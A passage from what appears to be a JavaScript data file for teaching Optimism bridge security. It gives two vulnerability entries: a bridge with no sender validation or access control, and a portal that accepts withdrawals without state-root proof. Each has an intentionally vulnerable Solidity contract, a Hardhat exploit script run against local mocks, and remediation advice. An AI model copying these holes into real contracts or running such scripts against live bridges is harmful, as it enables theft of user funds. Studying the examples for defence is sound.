    securityInsight: "According to the security report, cross-layer reentrancy is particularly dangerous in Optimism's architecture because it spans two different execution environments (L1 and L2). The complexity of this interaction makes these vulnerabilities difficult to identify through standard security practices. The report specifically notes that 'regular reentrancy guards might not catch these vulnerabilities since the reentrant call can come from a different layer' and highlights this as a unique challenge in cross-layer architectures that requires specialized security considerations."
  },
  
  {
    id: "direct-fund-theft",
    title: "Loss of user funds by direct theft",
    severity: "critical",
    description: "A critical vulnerability in Optimism's bridge contracts allows an attacker to directly steal user funds from the contract due to improper access controls and validation in cross-domain message processing. The vulnerability stems from missing sender validation checks in key withdrawal functions.",
    attackVector: [
      "Attacker identifies bridge contracts with missing access controls in finalization functions",
      "The vulnerable contract fails to properly validate that the call originated from the appropriate L2 contract",
      "Attacker directly calls the finalizeETHWithdrawal function with arbitrary parameters",
      "Contract executes the withdrawal and transfers funds to attacker-specified address",
      "Emergency functions that should be protected can also be called by any account"
    ],
    affectedContracts: ["L1StandardBridge", "OptimismPortal", "CrossL2Inbox", "L2ToL1MessagePasser"],
    vulnerableContract: {
      name: "VulnerableL1StandardBridge",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

/**
 * @title VulnerableL1StandardBridge
 * @notice A simplified version of the L1StandardBridge with vulnerabilities
 */
contract VulnerableL1StandardBridge {
    address public immutable MESSENGER;
    address public immutable L2_BRIDGE;
    
    mapping(address => uint256) public deposits;
    
    event ETHDepositInitiated(address indexed from, address indexed to, uint256 amount);
    event ETHWithdrawalFinalized(address indexed from, address indexed to, uint256 amount);
    
    constructor(address _messenger, address _l2Bridge) {
        MESSENGER = _messenger;
        L2_BRIDGE = _l2Bridge;
    }
    
    // Deposit ETH function
    function depositETH(address _to) external payable {
        deposits[msg.sender] += msg.value;
        
        emit ETHDepositInitiated(msg.sender, _to, msg.value);
        
        // Simplified message sending, in reality would cross domains
        bytes memory message = abi.encodeWithSignature(
            "finalizeDeposit(address,address,uint256)",
            msg.sender,
            _to,
            msg.value
        );
        
        // Send message to L2 (simplified for this example)
        IL1CrossDomainMessenger(MESSENGER).sendMessage(L2_BRIDGE, message, 100000);
    }
    
    // VULNERABLE: Missing proper validation of the sender
    // This function should only be callable via a cross-domain message
    function finalizeETHWithdrawal(
        address _from,
        address _to,
        uint256 _amount
    ) external {
        // VULNERABILITY: No validation that this was called via cross-domain message
        // Anyone can call this function directly and drain funds
        
        // Should check: require(msg.sender == MESSENGER && 
        //               IL1CrossDomainMessenger(MESSENGER).xDomainMessageSender() == L2_BRIDGE)
        
        (bool success, ) = _to.call{value: _amount}("");
        require(success, "ETH transfer failed");
        
        emit ETHWithdrawalFinalized(_from, _to, _amount);
    }
    
    // VULNERABLE: Anyone can call this emergency function
    function emergencyWithdraw(address _to, uint256 _amount) external {
        // VULNERABILITY: No access control
        // Should have: require(msg.sender == owner, "Not authorized");
        
        (bool success, ) = _to.call{value: _amount}("");
        require(success, "Emergency withdraw failed");
    }
    
    // For receiving ETH
    receive() external payable {}
}

interface IL1CrossDomainMessenger {
    function sendMessage(address _target, bytes memory _message, uint32 _gasLimit) external;
    function xDomainMessageSender() external view returns (address);
}`
    },
    exploitScript: {
      language: "javascript",
      code: `// File: exploit-direct-theft.js
const { ethers } = require("hardhat");

async function main() {
  console.log("Starting Direct Fund Theft Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy messenger mock
  const MessengerMock = await ethers.getContractFactory("L1CrossDomainMessengerMock");
  const messenger = await MessengerMock.deploy();
  await messenger.deployed();
  console.log(\`L1CrossDomainMessengerMock deployed at: \${messenger.address}\`);
  
  // Deploy L2 bridge mock (just for reference)
  const L2BridgeMock = await ethers.getContractFactory("L2BridgeMock");
  const l2Bridge = await L2BridgeMock.deploy();
  await l2Bridge.deployed();
  console.log(\`L2BridgeMock deployed at: \${l2Bridge.address}\`);
  
  // Deploy vulnerable bridge
  const VulnerableBridge = await ethers.getContractFactory("VulnerableL1StandardBridge");
  const bridge = await VulnerableBridge.deploy(messenger.address, l2Bridge.address);
  await bridge.deployed();
  console.log(\`VulnerableL1StandardBridge deployed at: \${bridge.address}\`);
  
  // Setup initial conditions
  const [owner, user1, attacker] = await ethers.getSigners();
  
  // User deposits ETH to the bridge
  const depositAmount = ethers.utils.parseEther("10");
  await user1.sendTransaction({
    to: bridge.address,
    value: depositAmount
  });
  console.log(\`User deposited \${ethers.utils.formatEther(depositAmount)} ETH to the bridge\`);
  
  // Check initial balances
  const initialBridgeBalance = await ethers.provider.getBalance(bridge.address);
  const initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(\`Initial bridge balance: \${ethers.utils.formatEther(initialBridgeBalance)} ETH\`);
  console.log(\`Initial attacker balance: \${ethers.utils.formatEther(initialAttackerBalance)} ETH\`);
  
  // Execute the attack - direct call to finalize withdrawal
  console.log("\\nExecuting the direct fund theft attack...");
  
  // Method 1: Call finalizeETHWithdrawal directly without any authentication
  const stealAmount = ethers.utils.parseEther("5");
  const tx1 = await bridge.connect(attacker).finalizeETHWithdrawal(
    user1.address, // from (in a real scenario this is the rightful owner)
    attacker.address, // to (the attacker's address)
    stealAmount // amount to steal
  );
  await tx1.wait();
  console.log(\`Attack 1: Called finalizeETHWithdrawal to steal \${ethers.utils.formatEther(stealAmount)} ETH\`);
  
  // Method 2: Call the emergency withdraw function with no access control
  const emergencyAmount = ethers.utils.parseEther("5");
  const tx2 = await bridge.connect(attacker).emergencyWithdraw(
    attacker.address,
    emergencyAmount
  );
  await tx2.wait();
  console.log(\`Attack 2: Called emergencyWithdraw to steal \${ethers.utils.formatEther(emergencyAmount)} ETH\`);
  
  // Check final balances
  const finalBridgeBalance = await ethers.provider.getBalance(bridge.address);
  const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(\`Final bridge balance: \${ethers.utils.formatEther(finalBridgeBalance)} ETH\`);
  console.log(\`Final attacker balance: \${ethers.utils.formatEther(finalAttackerBalance)} ETH\`);
  
  const stolenAmount = finalAttackerBalance.sub(initialAttackerBalance);
  console.log(\`Total stolen: \${ethers.utils.formatEther(stolenAmount)} ETH\`);
  
  // Verify the attack was successful
  if (stolenAmount.gt(ethers.utils.parseEther("0"))) {
    console.log("\\n✅ ATTACK SUCCESSFUL: Funds were directly stolen");
  } else {
    console.log("\\n❌ ATTACK FAILED: No funds were stolen");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });`
    },
    explanation: "This vulnerability allows an attacker to directly steal funds from the bridge contract due to missing authentication and access controls. In cross-domain architectures like Optimism, it's crucial to properly validate that certain functions can only be called by authorized cross-domain messengers with the correct sender.",
    keyPoints: [
      "Missing validation of `msg.sender` in critical fund-moving functions",
      "No verification that withdrawal calls come from the authorized cross-domain messenger",
      "No validation of `xDomainMessageSender` to ensure the message originated from the L2 bridge",
      "Emergency functions lack proper access controls"
    ],
    recommendations: [
      "Add proper sender validation checks using both `msg.sender` and `xDomainMessageSender`",
      "Implement strong access controls for all privileged functions, especially those handling funds",
      "Use a multi-signature or timelock mechanism for emergency functions",
      "Separate message execution from funds transfer to provide additional security layers"
    ],
    securityInsight: "In cross-domain architectures, the complexity of message passing creates many potential openings for attacks. Always enforce multiple layers of access controls and never trust a message without verifying both its origin messenger contract AND the original sender."
  },
  
  {
    id: "missing-state-root-verification",
    title: "Missing State Root Verification",
    severity: "critical",
    description: "A critical vulnerability in Optimism's withdrawal system where the OptimismPortal doesn't properly verify withdrawal proofs against authenticated state roots, potentially allowing processing of fraudulent withdrawal transactions and theft of layer 1 funds.",
    attackVector: [
      "Attacker identifies that the OptimismPortal's proveWithdrawalTransaction function lacks proper merkle proof verification",
      "Attacker creates a fraudulent withdrawal transaction that doesn't exist on L2",
      "The vulnerable contract accepts the withdrawal without verifying against a validated state root",
      "Attacker marks the withdrawal as proven without any cryptographic verification",
      "Attacker finalizes the withdrawal and receives funds they never deposited or owned on L2"
    ],
    affectedContracts: ["OptimismPortal", "L2ToL1MessagePasser", "FaultDisputeGame"],
    vulnerableContract: {
      name: "VulnerableOptimismPortal",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

/**
 * @title VulnerableOptimismPortal
 * @notice Simplified version of OptimismPortal with state root verification vulnerability
 */
contract VulnerableOptimismPortal {
    // Struct to represent a withdrawal transaction
    struct WithdrawalTransaction {
        address target;
        uint256 value;
        uint256 nonce;
        bytes data;
    }
    
    // Mapping of withdrawal hash to boolean (true if withdrawal was already proven)
    mapping(bytes32 => bool) public provenWithdrawals;
    
    // Mapping of withdrawal hash to boolean (true if withdrawal was already finalized)
    mapping(bytes32 => bool) public finalizedWithdrawals;
    
    // L2 Oracle for state root verification - should be used but isn't in vulnerable version
    address public l2Oracle;
    
    event WithdrawalProven(bytes32 indexed withdrawalHash, address indexed from, address indexed to);
    event WithdrawalFinalized(bytes32 indexed withdrawalHash, bool success);
    
    constructor(address _l2Oracle) {
        l2Oracle = _l2Oracle;
    }
    
    // VULNERABLE: Does not validate the withdrawal with a state root verification
    function proveWithdrawalTransaction(
        WithdrawalTransaction memory _tx,
        bytes32 /* _stateRoot - unused in vulnerable version */,
        bytes memory /* _withdrawalProof - unused in vulnerable version */
    ) external returns (bytes32) {
        bytes32 withdrawalHash = hashWithdrawalTransaction(_tx);
        
        // VULNERABILITY: No verification against an L2 state root
        // Should use the L2Oracle to verify the withdrawal is actually in the state
        // Something like: require(MerkleLib.verify(_withdrawalProof, _stateRoot, withdrawalHash), "Invalid proof");
        
        // Just mark as proven without any real verification
        provenWithdrawals[withdrawalHash] = true;
        
        emit WithdrawalProven(withdrawalHash, msg.sender, _tx.target);
        
        return withdrawalHash;
    }
    
    // Finalize a withdrawal transaction that has been proven
    function finalizeWithdrawalTransaction(
        WithdrawalTransaction memory _tx
    ) external {
        bytes32 withdrawalHash = hashWithdrawalTransaction(_tx);
        
        // Check that the withdrawal has been proven
        require(provenWithdrawals[withdrawalHash], "Withdrawal has not been proven");
        
        // Check that the withdrawal has not been finalized already
        require(!finalizedWithdrawals[withdrawalHash], "Withdrawal has already been finalized");
        
        // Mark the withdrawal as finalized
        finalizedWithdrawals[withdrawalHash] = true;
        
        // Execute the withdrawal
        (bool success, ) = _tx.target.call{value: _tx.value}(_tx.data);
        
        emit WithdrawalFinalized(withdrawalHash, success);
    }
    
    // Hash a withdrawal transaction
    function hashWithdrawalTransaction(
        WithdrawalTransaction memory _tx
    ) public pure returns (bytes32) {
        return keccak256(
            abi.encode(
                _tx.target,
                _tx.value,
                _tx.nonce,
                keccak256(_tx.data)
            )
        );
    }
    
    // Receive ETH function
    receive() external payable {}
}`
    },
    exploitScript: {
      language: "javascript",
      code: `// File: exploit-missing-root-verification.js
const { ethers } = require("hardhat");

async function main() {
  console.log("Starting Missing State Root Verification Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy L2 oracle mock (just a reference, not actually used in the exploit)
  const L2OracleMock = await ethers.getContractFactory("L2OracleMock");
  const l2Oracle = await L2OracleMock.deploy();
  await l2Oracle.deployed();
  console.log(\`L2OracleMock deployed at: \${l2Oracle.address}\`);
  
  // Deploy vulnerable portal contract
  const VulnerablePortal = await ethers.getContractFactory("VulnerableOptimismPortal");
  const portal = await VulnerablePortal.deploy(l2Oracle.address);
  await portal.deployed();
  console.log(\`VulnerableOptimismPortal deployed at: \${portal.address}\`);
  
  // Deploy a simple bank contract that will be the target of the fraudulent withdrawal
  const TargetBank = await ethers.getContractFactory("SimpleBank");
  const bank = await TargetBank.deploy();
  await bank.deployed();
  console.log(\`SimpleBank deployed at: \${bank.address}\`);
  
  // Setup initial conditions
  const [owner, user1, attacker] = await ethers.getSigners();
  
  // Fund the bank
  await owner.sendTransaction({
    to: bank.address,
    value: ethers.utils.parseEther("50")
  });
  console.log(\`Bank funded with 50 ETH\`);
  
  // Check initial balances
  const initialBankBalance = await ethers.provider.getBalance(bank.address);
  const initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(\`Initial bank balance: \${ethers.utils.formatEther(initialBankBalance)} ETH\`);
  console.log(\`Initial attacker balance: \${ethers.utils.formatEther(initialAttackerBalance)} ETH\`);
  
  // Fund the portal for withdrawal execution
  await owner.sendTransaction({
    to: portal.address,
    value: ethers.utils.parseEther("50")
  });
  console.log(\`Portal funded with 50 ETH for withdrawals\`);
  
  // Execute the attack
  console.log("\\nExecuting the missing state root verification attack...");
  
  // Create a fraudulent withdrawal transaction that transfers funds from the bank
  const withdrawalAmount = ethers.utils.parseEther("25");
  const fraudulentWithdrawal = {
    target: bank.address,
    value: 0, // No ETH directly transferred by the portal
    nonce: 1337, // Any nonce works as there's no real verification
    data: bank.interface.encodeFunctionData("withdraw", [attacker.address, withdrawalAmount])
  };
  
  // Step 1: Prove the withdrawal without any real proof
  console.log("Proving fraudulent withdrawal...");
  const fakeMerkleRoot = ethers.utils.hexlify(ethers.utils.randomBytes(32));
  const fakeProof = ethers.utils.hexlify(ethers.utils.randomBytes(1024));
  
  const proveTx = await portal.connect(attacker).proveWithdrawalTransaction(
    fraudulentWithdrawal,
    fakeMerkleRoot,
    fakeProof
  );
  await proveTx.wait();
  
  // Step 2: Finalize the fraudulent withdrawal
  console.log("Finalizing fraudulent withdrawal...");
  const finalizeTx = await portal.connect(attacker).finalizeWithdrawalTransaction(
    fraudulentWithdrawal
  );
  await finalizeTx.wait();
  
  // Check final balances
  const finalBankBalance = await ethers.provider.getBalance(bank.address);
  const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(\`Final bank balance: \${ethers.utils.formatEther(finalBankBalance)} ETH\`);
  console.log(\`Final attacker balance: \${ethers.utils.formatEther(finalAttackerBalance)} ETH\`);
  
  const stolenAmount = finalAttackerBalance.sub(initialAttackerBalance);
  console.log(\`Attacker balance increased by: \${ethers.utils.formatEther(stolenAmount)} ETH\`);
  
  // Verify the attack was successful
  if (finalBankBalance.lt(initialBankBalance)) {
    console.log("\\n✅ ATTACK SUCCESSFUL: Funds withdrawn without valid state root verification");
  } else {
    console.log("\\n❌ ATTACK FAILED: Could not exploit missing state root verification");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });`
    },
    explanation: "This vulnerability allows an attacker to bypass the critical state root verification step in the cross-domain bridge. In rollup architectures like Optimism, withdrawals from L2 to L1 must be proven to exist in the L2 state by providing a Merkle proof against a known state root. Without this verification, an attacker can craft fraudulent withdrawals.",
    keyPoints: [
      "The `proveWithdrawalTransaction` function doesn't validate the withdrawal proof against a state root",
      "No verification that the withdrawal actually happened on L2",
      "The function accepts `_stateRoot` and `_withdrawalProof` parameters but doesn't use them",
      "Once a withdrawal is marked as 'proven', it can later be finalized and executed"
    ],
    recommendations: [
      "Implement proper cryptographic verification of withdrawal proofs against L2 state roots",
      "Ensure state roots are sourced from a trusted L2 oracle with appropriate security measures",
      "Add a challenge period before finalizing withdrawals to allow for fraud disputes",
      "Implement rate limiting and amount caps on withdrawals to minimize potential damage"
    ],
    securityInsight: "State root verification is the fundamental security mechanism behind rollup technology. Without it, the entire bridge security model collapses, allowing attackers to create fake withdrawals. This is especially dangerous as it can be exploited in a one-shot attack, potentially draining all L1 funds."
  }
];
